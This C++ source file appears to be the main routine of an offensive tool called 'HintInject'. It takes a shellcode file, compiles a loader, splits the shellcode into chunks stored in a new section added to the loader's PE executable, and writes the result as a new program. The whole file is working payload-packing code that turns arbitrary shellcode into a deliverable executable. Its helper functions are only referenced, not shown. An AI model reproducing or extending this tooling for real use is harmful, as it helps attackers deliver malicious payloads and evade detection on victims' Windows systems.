#include <Windows.h>
#include <iostream>
#include <time.h>
#include "Utils.h"
#include "FakeEntry.h"

void PrintBanner() {
	LPCSTR banner =
		"                                                                      \n"
		",--.  ,--.,--.          ,--.  ,--.          ,--.               ,--.   \n"
		"|  '--'  |`--',--,--, ,-'  '-.|  |,--,--,   `--' ,---.  ,---.,-'  '-. \n"
		"|  .--.  |,--.|      \\'-.  .-'|  ||      \\  ,--.| .-. :| .--''-.  .-' \n"
		"|  |  |  ||  ||  ||  |  |  |  |  ||  ||  |  |  |\\   --.\\ `--.  |  |   \n"
		"`--'  `--'`--'`--''--'  `--'  `--'`--''--'.-'  / `----' `---'  `--'   \n"
		"                                          '---'                       \n";
	std::cout << banner << std::endl;
}

void PrintHelp(LPCSTR exeName) {
	std::cout << "[+] Usage: " << exeName << " <Shellcode File> <Output Name>";
}


int main(int argc, char* argv[]) {
	PrintBanner();
	if (argc != 3) {
		PrintHelp(argv[0]);
		return -1;
	}
	srand(time(NULL));
	size_t shellcodeSize = 0;
	size_t loaderSize = 0;
	size_t newPESize = 0;
	uint64_t numberOfChunks = 0;
	PBYTE shellcodeContent = ReadFileFromDisk(argv[1], shellcodeSize);
	if (shellcodeContent == NULL || shellcodeSize == 0) {
		std::cout << "[!] Error on reading the shellcode file !" << std::endl;
		return -1;
	}
	LPCSTR loaderPath = CompileLoader();
	if (loaderPath == NULL) {
		std::cout << "[!] Error on loader compilation !" << std::endl;
		return -1;
	}
	PBYTE loaderContent = ReadFileFromDisk(loaderPath, loaderSize);
	if (loaderContent == NULL || loaderSize == 0) {
		std::cout << "[!] Error on reading the loader binary !" << std::endl;
		return -1;
	}
	PBYTE hintArray = SplitShellcode(shellcodeContent, shellcodeSize, numberOfChunks);
	if (hintArray == NULL || numberOfChunks == 0) {
		std::cout << "[!] Splitting shellcode problem !" << std::endl;
		return -1;
	}
	PBYTE newPeFileContent = AddNewSection(loaderContent, loaderSize, numberOfChunks, newPESize);
	if (newPeFileContent == NULL || newPESize == 0) {
		std::cout << "[!] Appending new section problem !" << std::endl;
		return -1;
	}
	if (!WriteNewPE(argv[2], newPeFileContent, newPESize)) {
		std::cout << "[!] Error on writing !" << std::endl;
		return -1;
	}
	return 0;
}